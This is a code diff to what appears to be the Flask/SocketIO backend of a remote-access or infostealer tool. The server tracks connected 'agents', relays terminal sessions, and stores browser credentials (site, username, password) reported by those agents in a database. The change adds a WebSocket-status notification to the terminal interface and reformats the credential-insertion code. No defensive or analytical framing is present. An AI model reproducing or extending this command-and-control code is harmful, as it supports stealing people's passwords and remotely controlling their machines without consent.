@@ -241,6 +241,14 @@ def init_api_routes(app, socketio):
                                 'connected' in data['result'].get('message', '').lower()) else 0
                 c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                         (ws_connected, data['agent_id']))
+                
+                # Notify terminal interface of WebSocket status change
+                socketio.emit('ws_status', {
+                    'agent_id': data['agent_id'],
+                    'action': data['result'].get('action', ''),
+                    'status': 'success' if ws_connected else 'error',
+                    'message': data['result'].get('message', '')
+                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
             
             # Handle terminal output
             if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
@@ -269,9 +277,9 @@ def init_api_routes(app, socketio):
                     try:
                         c.execute('''INSERT INTO credentials 
                                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                                 (None, data['agent_id'], cred.get('browser', ''), 
-                                  cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
-                                  datetime.now().isoformat().split('.')[0].replace('T', ' ')))
+                                (None, data['agent_id'], cred.get('browser', ''), 
+                                cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
+                                datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                     except Exception as e:
                         pass
             
@@ -291,7 +299,7 @@ def init_api_routes(app, socketio):
                 conn.rollback()
                 conn.close()
             return jsonify({'status': 'error', 'message': str(e)}), 500
+                
             
-          
             
          
